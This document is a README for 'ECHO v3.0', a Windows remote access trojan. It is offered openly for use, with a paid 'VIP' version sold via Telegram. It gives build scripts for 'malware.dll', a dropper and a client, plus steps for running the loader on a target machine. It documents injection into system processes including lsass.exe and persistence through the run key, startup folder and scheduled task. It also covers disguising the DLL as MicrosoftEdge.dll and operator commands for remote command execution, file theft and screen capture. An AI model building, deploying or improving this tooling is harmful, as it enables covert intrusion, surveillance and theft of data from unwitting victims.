# 🚀 ECHO v3.0 - Encrypted ChaCha20 Hopping Operator

[![Windows](https://img.shields.io/badge/Platform-Windows-0078D6?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
[![C++](https://img.shields.io/badge/Language-C++11-00599C?style=flat-square&logo=c%2B%2B)](https://isocpp.org/)

![ECHO](https://github.com/user-attachments/assets/39fa92a0-5afc-4ec2-809f-40e1a5affc42)

> **ECHO v3.0 — A sophisticated, stealth-oriented Remote Access Framework featuring ChaCha20 encrypted communication, DLL process injection with auto-migration, dynamic port hopping, file transfer, screenshot capture, persistence, and optional Telegram bot integration.**

---

## 📋 Table of Contents

- [Overview](#-overview)
- [What's New in v3.0](#-whats-new-in-v30)
- [Features](#-features)
- [Architecture](#-architecture)
- [Project Structure](#-project-structure)
- [Dependencies](#-dependencies)
- [Quick Start](#-quick-start)
- [Configuration Guide](#-configuration-guide)
- [Telegram Integration](#-telegram-integration)
- [Process Injection & Migration](#-process-injection--migration)
- [Commands Reference](#-commands-reference)
- [Client UI](#-client-ui)
- [Building from Source](#-building-from-source)
- [Troubleshooting](#-troubleshooting)

---

## 🎯 Overview

ECHO v3.0 is a professional-grade Remote Access Framework written in **C++11** for Windows environments. It provides secure, encrypted remote access with advanced capabilities including **process migration with automatic session handover**, **dynamic port hopping**, **encrypted file transfer**, **screenshot capture**, and **optional Telegram notifications**.

The framework is designed around three components:

- **Server (DLL)** — Injected into a target process. Listens for encrypted commands, executes them, and can migrate itself to other processes.
- **Client (EXE)** — Operator console with a modern ANSI-colored UI. Connects to the server, sends encrypted commands, and displays results.
- **Loader (EXE)** — Dropper that extracts the embedded DLL and injects it into system or user processes.

**Key Architecture:**
- **Crypto Layer** — ChaCha20 stream cipher for all client/server communication.
- **Framing Protocol** — Length-prefixed encrypted messages with chunked transfer for large payloads (up to 100 MB).
- **Migration** — DLL self-injection into another process with automatic socket handover and client auto-reconnect.
- **Port Hopping** — Server can rebind to a new port on demand; client auto-reconnects.
- **Telegram Module** — Optional startup notifications with random port generation and IP reporting.

---

## 🆕 What's New in v3.0

| Feature | Description |
|---------|-------------|
| 🔐 **ChaCha20 Encryption** | Replaced XOR with full ChaCha20 stream cipher (RFC 7539). |
| 💉 **Real Process Migration** | `migrate <pid\|name>` now transfers the session to the target process. The old listener releases the port, the injected DLL binds it, and the client **reconnects automatically**. |
| 🎨 **Modern Client UI** | ANSI-colored interface with banner, colored prompt, progress bars, and structured output. |
| 🔄 **Auto-Reconnect** | After `migrate` or `hop`, the client attempts reconnection automatically with retries and verification. |
| 🛡️ **Safe Telegram Fallback** | If `TELEGRAM` is enabled but token/chat_id are empty, the server falls back to `DEFAULT_PORT` instead of crashing. |
| 📸 **Screenshot Capture** | Remote screen capture streamed back as BMP with progress bar. |
| 💾 **Persistence** | Install RunKey + Startup folder + optional SYSTEM scheduled task. |
| 🧠 **Rich System Info** | `me` returns PID, name, path, parent, user, elevation, integrity, and architecture. |
| 📊 **Detailed Process List** | `ps` shows PID, PPID, and name in a formatted table. |

---

## ✨ Features

| Category | Capabilities |
|----------|--------------|
| 🔐 **Encryption** | ChaCha20 stream cipher, session key management, length-prefixed framing, chunked transfer |
| 💉 **Injection** | Remote thread injection via `LoadLibraryA`, 12+ system targets, user targets, automatic fallback |
| 🔄 **Migration** | Self-inject into target process, socket handover, client auto-reconnect |
| 🔀 **Port Hopping** | On-demand port change, listener handover, optional Telegram notification |
| 🤖 **Telegram** | Random port generation (20000–60000), startup message, hop notification |
| 📁 **File Transfer** | Upload/download with 8 KB chunks, progress bars, 100 MB limit |
| 💻 **Command Execution** | Remote `cmd.exe` execution, working directory tracking, 50 MB output cap |
| 📸 **Screenshot** | Full virtual screen capture to BMP, streamed to client |
| 💾 **Persistence** | HKCU RunKey, Startup folder copy, optional SYSTEM scheduled task |
| 🛡️ **Stealth** | No console windows in DLL, hidden temp files, legit process masking (`MicrosoftEdge.dll`) |
| 🎨 **Client UI** | ANSI colors, banner, colored prompts, progress bars, structured output |

---

## 🏗 Architecture

```
┌─────────────────────┐         ChaCha20          ┌─────────────────────┐
│                     │  ◄─────────────────────►  │                     │
│   Client (EXE)      │   Length-prefixed frames  │   Server (DLL)      │
│   Operator Console  │                           │   Inside target     │
│                     │                           │   process           │
└─────────────────────┘                           └─────────────────────┘
                                                            │
                                                            │ LoadLibraryA
                                                            ▼
                                                  ┌─────────────────────┐
                                                  │  Loader (EXE)       │
                                                  │  Extracts & injects │
                                                  │  embedded DLL       │
                                                  └─────────────────────┘
```

**Server lifecycle:**
1. Loader extracts embedded DLL to `%TEMP%` and injects it into a target process.
2. `DllMain` (`DLL_PROCESS_ATTACH`) initializes crypto, optionally Telegram, and spawns the listener thread.
3. Listener binds to `DEFAULT_PORT` (or a random port if Telegram is configured).
4. Client connects, sends encrypted commands, receives encrypted responses.
5. On `migrate`, the server injects itself into a new process, releases the port, and the new process binds it. Client reconnects.

---

## 📁 Project Structure

```text
ECHO-v3/
│
├── 📄 client.cpp          # Operator client (encrypted, modern UI)
├── 📄 server.cpp          # Main server DLL (listener, commands, migration)
├── 📄 loader.cpp          # DLL injector / dropper (embeds packed.h)
├── 📄 packed.h            # Generated by pack.py (embedded DLL bytes)
├── 📄 pack.py             # Python packer: DLL → C++ header
├── 📄 build.bat           # One-shot build script
│
└── 📁 lib/
    ├── 🔒 crypto.h        # ChaCha20 class declaration
    ├── 🔒 crypto.cpp      # ChaCha20 implementation
    ├── 📡 telegram.h      # Telegram class declaration
    ├── 📡 telegram.cpp    # Telegram HTTP client
    ├── 💾 persist.h       # Persistence class declaration
    └── 💾 persist.cpp     # Persistence implementation
```

---

## 📦 Dependencies

### Windows Requirements

| Component | Version | Purpose |
|-----------|---------|---------|
| Windows OS | 7 / 8 / 10 / 11 | Target platform |
| Winsock2 | Built-in | Network communication |
| GDI32 / User32 | Built-in | Screenshot capture |
| WinINet | Built-in | Telegram HTTP (optional) |

### Development Tools

| Tool | Version | Purpose |
|------|---------|---------|
| TDM-GCC | 9.2.0+ | Compiler for DLL/EXE |
| MinGW-w64 | 8.1.0+ | Alternative compiler |
| Python | 3.x | Running `pack.py` |

### Libraries (Linked)

| Library | Purpose |
|---------|---------|
| `ws2_32` | Winsock2 |
| `gdi32` | Screenshot |
| `user32` | Windows API |
| `wininet` | Telegram HTTP (only when `TELEGRAM` enabled) |
| `shell32` / `advapi32` | Persistence |

---

## 🚀 Quick Start

### 1. Clone the Repository

```bash
git clone https://github.com/esfelorm/ECHO
cd ECHO-v3
```

### 2. Configure

Edit `server.cpp`:

```cpp
int DEFAULT_PORT = 4545;    // Change default port if desired
// #define TELEGRAM           // Uncomment to enable Telegram
```

Edit `lib/telegram.cpp` (only if using Telegram):

```cpp
bot_token = "YOUR_BOT_TOKEN";
chat_id   = "YOUR_CHAT_ID";
```

### 3. Build

```bash
build.bat
```

This produces:
- `malware.dll` — Server DLL
- `client.exe` — Operator client
- `packed.h` — Embedded DLL header
- `loader.exe` — Dropper/injector

### 4. Deploy

```bash
# On target machine
loader.exe

# On attacker machine
client.exe
# Enter server IP and port
```

---

## ⚙️ Configuration Guide

### Server Configuration (`server.cpp`)

```cpp
#define BUFFER_SIZE 51192            // Network buffer
#define FILE_BUFFER 8192             // File transfer chunk
#define SOCKET_TIMEOUT_MS 120000     // 2 minutes socket timeout

int DEFAULT_PORT = 4545;             // Default port
                                     // Ignored when Telegram is configured

// #define TELEGRAM                // Enable Telegram (random port + notifications)
                                     // If enabled but token/chat_id empty,
                                     // falls back to DEFAULT_PORT

const unsigned char SECRET_KEY[] = "MyUltraSecureKey2024!@#$%Remote";
```

### Client Configuration (`client.cpp`)

The client prompts for IP and port at startup:

```
Server IP   [127.0.0.1]: 
Server Port [4545]: 
```

Press Enter to accept defaults or type custom values.

### Loader Configuration (`loader.cpp`)

System targets (attempted first if admin):

```cpp
L"explorer.exe", L"svchost.exe", L"winlogon.exe",
L"services.exe", L"lsass.exe", L"spoolsv.exe",
L"taskhost.exe", L"dwm.exe", L"wininit.exe", L"conhost.exe"
```

User targets (used when non-admin or system injection fails):

```cpp
L"notepad.exe", L"calc.exe", L"mspaint.exe", L"write.exe"
```

The DLL is dropped to `%APPDATA%\MicrosoftEdge.dll` (hidden) and `%TEMP%\svchost_<pid>.tmp` for injection.

---

## 🤖 Telegram Integration

### How It Works

When `#define TELEGRAM` is uncommented in `server.cpp` **and** valid `bot_token` / `chat_id` are set in `lib/telegram.cpp`:

1. 🔄 **Random port** — Server picks a random port in `[20000, 60000)`.
2. 📡 **Startup notification** — Sends a message to your Telegram bot:
   ```
   [ECHO-V3] Server started on port 47832
   ```
3. 🔀 **Hop notification** — On `hop <port>`, sends:
   ```
   [ECHO-V3] Hopped from 47832 to 5555
   ```
4. 🛡️ **Safe fallback** — If token or chat_id is empty, server silently falls back to `DEFAULT_PORT` and disables Telegram.

### Setup Instructions

#### Step 1: Create a Telegram Bot

1. Open Telegram and message **@BotFather**.
2. Send `/newbot` and follow the prompts.
3. Save the **bot token** (format: `123456789:ABCdefGHIjklmNOPqrstUvWXyz`).

#### Step 2: Get Your Chat ID

1. Send any message to your new bot.
2. Visit `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`.
3. Copy the `chat.id` value from the JSON response.

#### Step 3: Configure `lib/telegram.cpp`

```cpp
AutoHopTelegram::AutoHopTelegram() {
    bot_token  = "123456789:ABCdefGHIjklmNOPqrstUvWXyz";
    chat_id    = "7295479621";
    configured = (!bot_token.empty() && !chat_id.empty());
}
```

#### Step 4: Enable in `server.cpp`

```cpp
#define TELEGRAM
```

#### Step 5: Rebuild

```bash
build.bat
```

---

## 💉 Process Injection & Migration

### Automatic Injection (Loader)

The loader tries to inject into processes in this order:

1. If **admin**: system targets first, then user targets.
2. If **non-admin**: user targets first, then system targets.

Injection uses `OpenProcess` + `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` with `LoadLibraryA`.

### Manual Migration (`migrate` command)

The `migrate <pid|name>` command performs **live session migration**:

1. Resolve the target PID (numeric or by process name substring).
2. Verify architecture match (x86 vs x64).
3. Inject the current DLL into the target via `LoadLibraryA`.
4. Wait for the remote thread to complete.
5. **Release the old listener** so the new process can bind the same port.
6. Return a success message; the client **reconnects automatically**.

**Example:**

```
[4545] $> migrate notepad.exe
  [MIGRATE] Injecting into notepad.exe...
[+] Migrated to PID 11064 (notepad.exe) — module base 0x75c90000
    Old listener released. New process should now be listening.
  [MIGRATE] Server is switching processes. Reconnecting...
  [MIGRATE] Reconnect attempt 1/15 -> 127.0.0.1:4545  
  [+] Reconnected via migrated process

[4545] $> me
[+] Current Process
==================================================
 PID          : 11064
 Name         : Notepad.exe
 Path         : C:\Program Files\WindowsApps\...\Notepad.exe
 Parent PID   : 15008 (explorer.exe)
 User         : SPECTER\007
 Elevated     : NO
 Integrity    : Medium
 Architecture : x64
==================================================
```

> ⚠️ **Important: If Auto-Reconnect Fails**
>
> In some cases — for example when the target process is a **Store/UWP app** (like the new Windows 11 Notepad from `WindowsApps`), when Windows Defender blocks the injection, or when the process takes longer than usual to bind the port — the client's automatic reconnect may fail with:
>
> ```
> [!] Reconnect failed — migrated process may not be listening
> ```
>
> **What to do:**
>
> 1. **Manually restart the client** — close `client.exe` and run it again.
> 2. Enter the **same IP and the same port** you were connected to before the migration.
> 3. If the connection succeeds, the migrated process is listening and you can continue from where you left off.
> 4. If the connection still fails after restarting the client, wait **5–10 seconds** and try again — the injected DLL may need a bit more time to fully initialize.
> 5. If it never connects, migrate to a different target process such as **`mspaint.exe`**, **`calc.exe`**, or the classic **`C:\Windows\System32\notepad.exe`** (not the Store version). These bind faster and more reliably.
>
> **Why does this happen?** The auto-reconnect loop in the client tries for about 18 seconds (15 attempts × 1.2s). If the target process hasn't finished binding the port by then, the loop gives up. Restarting the client gives the injected DLL more time and retries the connection from scratch.

### Injection Targets

| Process | Description | Stealth | Success Rate |
|---------|-------------|---------|--------------|
| `explorer.exe` | Windows Shell | ⭐⭐⭐⭐⭐ | Very High |
| `svchost.exe` | Service Host | ⭐⭐⭐⭐⭐ | Very High |
| `notepad.exe` | Notepad (classic) | ⭐⭐⭐ | High |
| `winlogon.exe` | Windows Logon | ⭐⭐⭐⭐ | Medium (admin) |
| `services.exe` | Service Manager | ⭐⭐⭐⭐ | Medium (admin) |
| `lsass.exe` | LSA Service | ⭐⭐⭐⭐ | Medium (admin) |
| `spoolsv.exe` | Print Spooler | ⭐⭐⭐⭐ | High |
| `taskhost.exe` | Task Host | ⭐⭐⭐ | High |
| `dwm.exe` | Desktop Manager | ⭐⭐⭐⭐ | High |
| `wininit.exe` | Windows Init | ⭐⭐⭐ | Low (admin) |
| `conhost.exe` | Console Host | ⭐⭐⭐⭐ | Very High |
| `mspaint.exe` / `calc.exe` | User apps | ⭐⭐⭐ | High |

---

## 📖 Commands Reference

### Basic

| Command | Description |
|---------|-------------|
| `help` | Show command reference |
| `clear` / `cls` | Clear screen and reprint banner |
| `exit` / `quit` | Disconnect and exit |
| `pwd` | Print working directory on target |
| `cd <path>` | Change working directory |

### System

| Command | Description |
|---------|-------------|
| `ps` / `tasklist` | List running processes (PID + PPID + name) |
| `me` / `whoami` | Current process info (PID, name, path, parent, user, elevation, integrity, arch) |
| `sysinfo` | Hostname, username, OS version, CPU brand, cores, RAM total/free, arch, elevation, integrity |
| `persist` | Install persistence (RunKey + Startup folder + optional scheduled task) |
| `<any cmd>` | Execute arbitrary command via `cmd.exe /c` |

### Process Management

| Command | Description |
|---------|-------------|
| `migrate <pid>` | Inject DLL into process by PID |
| `migrate <name>` | Inject DLL into process by name (substring match) |

### Network

| Command | Description |
|---------|-------------|
| `hop <port>` | Change listening port and auto-reconnect |

### File Transfer

| Command | Description |
|---------|-------------|
| `upload <file>` | Upload local file to target's current directory |
| `download <file>` | Download file from target's current directory |

### Screen

| Command | Description |
|---------|-------------|
| `screenshot` | Capture target's screen to `screenshot_YYYYMMDD_HHMMSS.bmp` |

### Internal

| Command | Description |
|---------|-------------|
| `CRYPTO_SYNC` | Reset crypto stream state (used during reconnect) |

---

## 🎨 Client UI

The client features a modern ANSI-colored interface:

```
+================================================================+
|                                                                |
|   ███████╗ ██████╗██╗  ██╗ ██████╗     ██╗   ██╗██████╗        |
|   ██╔════╝██╔════╝██║  ██║██╔═══██╗    ██║   ██║╚════██╗       |
|   █████╗  ██║     ███████║██║   ██║    ██║   ██║ █████╔╝       |
|   ██╔══╝  ██║     ██╔══██║██║   ██║    ╚██╗ ██╔╝ ╚═══██╗       |
|   ███████╗╚██████╗██║  ██║╚██████╔╝     ╚████╔╝ ██████╔╝       |
|   ╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝       ╚═══╝  ╚═════╝        |
|                                                                |
|                  Encrypted Remote Operator v3.0                |
+================================================================+
  [+] ChaCha20 Encrypted  [+] Port Hopping  [+] DLL Migration
----------------------------------------------------------------
```

Prompt:

```
[ECHO|127.0.0.1:4545] > 
```

Color scheme:
- **Cyan** — Banner and host
- **Green** — Prompt arrow, success messages
- **Yellow** — Port, warnings, progress
- **Red** — Errors, disconnect
- **Purple** — Brackets and dividers
- **Gray** — Help text and dimmed info
- **White** — Command output

Progress bars for upload/download/screenshot:

```
[UPLOAD] backdoor.exe (1048576 bytes)
  [========================================] 100%
  [+] Upload complete
```

---

## 🔨 Building from Source

### Prerequisites

- **Windows 7+**
- **TDM-GCC** or **MinGW-w64** (with C++11 support)
- **Python 3.x** (for `pack.py`)
- **`ws2_32`, `gdi32`, `user32`, `wininet`, `shell32`, `advapi32`** (all built-in)

### Build Script (`build.bat`)

```bat
@echo off
cls
title ECHO-V3 Builder
color 0A

echo.
echo  ==========================================
echo         ECHO-V3 - Payload Builder
echo  ==========================================
echo.

set DLL_NAME=malware.dll
set CLIENT_NAME=client.exe
set INJECTOR_NAME=loader.exe
set PACKED_HEADER=packed.h

echo [1/4] Compiling Server DLL...
g++ -shared -o %DLL_NAME% server.cpp lib/crypto.cpp lib/persist.cpp lib/telegram.cpp ^
    -I. -lws2_32 -lwsock32 -lgdi32 -luser32 -lwininet ^
    -static-libgcc -static-libstdc++ -O2 -s -std=c++11
if %errorlevel% neq 0 goto :error

echo [2/4] Compiling Client...
g++ -o %CLIENT_NAME% client.cpp lib/crypto.cpp -I. ^
    -lws2_32 -static-libgcc -static-libstdc++ -O2 -s -std=c++11
if %errorlevel% neq 0 goto :error

echo [3/4] Packing DLL to Header...
if exist %PACKED_HEADER% del %PACKED_HEADER%
python pack.py %DLL_NAME% %PACKED_HEADER%
if %errorlevel% neq 0 goto :error

echo [4/4] Compiling Loader...
g++ -o %INJECTOR_NAME% loader.cpp -lws2_32 -lwininet -lole32 -luuid ^
    -lshell32 -ladvapi32 -static-libgcc -static-libstdc++ -O2 -s ^
    -mwindows -std=c++11
if %errorlevel% neq 0 goto :error

echo.
echo  [ok] %DLL_NAME%
echo  [ok] %CLIENT_NAME%
echo  [ok] %PACKED_HEADER%
echo  [ok] %INJECTOR_NAME%
goto :eof

:error
echo Build failed.
pause
exit /b 1
```

### Manual Build Commands

```bash
# 1. Server DLL
g++ -shared -o malware.dll server.cpp lib/crypto.cpp lib/persist.cpp lib/telegram.cpp ^
    -I. -lws2_32 -lgdi32 -luser32 -lwininet -static-libgcc -static-libstdc++ -O2 -s -std=c++11

# 2. Client
g++ -o client.exe client.cpp lib/crypto.cpp -I. -lws2_32 ^
    -static-libgcc -static-libstdc++ -O2 -s -std=c++11

# 3. Pack DLL to header
python pack.py malware.dll packed.h

# 4. Loader
g++ -o loader.exe loader.cpp -lws2_32 -lwininet -lole32 -luuid ^
    -lshell32 -ladvapi32 -static-libgcc -static-libstdc++ -O2 -s -mwindows -std=c++11
```

---

## 🐛 Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| `'__cpuid' was not declared` | MinGW missing `<cpuid.h>` | Add `#include <cpuid.h>` and use `__get_cpuid` (already handled in v3.0) |
| `bind` fails on default port | Port already in use or old listener not released | Server retries bind for 10 seconds, then falls back to `port+1` |
| Migration succeeds but client can't reconnect | Old listener still holding the port | v3.0 releases the listener **before** sending the migrate response |
| **Auto-reconnect after `migrate` fails** | Target process slow to bind (Store/UWP apps, AV delay) | **Close and re-run `client.exe`**, connect to the same IP/port. If it still fails, wait 5–10s and retry, or migrate to a faster process (`mspaint.exe`, classic `notepad.exe`). |
| Telegram startup crashes | Token or chat_id empty | v3.0 detects empty config and falls back to `DEFAULT_PORT` |
| Client hangs after `migrate` | Notepad (Store version) slow to bind | Increase reconnect attempts; use `mspaint.exe` or classic `notepad.exe` |
| Screenshot shows black image | GDI capture failed | Ensure server runs in an interactive session (not Session 0) |

---

# Vip

Buy Vip Version:   <a href="https://t.me/batmanpriv">
    <img src="https://img.shields.io/badge/Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white&labelColor=0a0a0a" alt="Telegram" />
  </a>
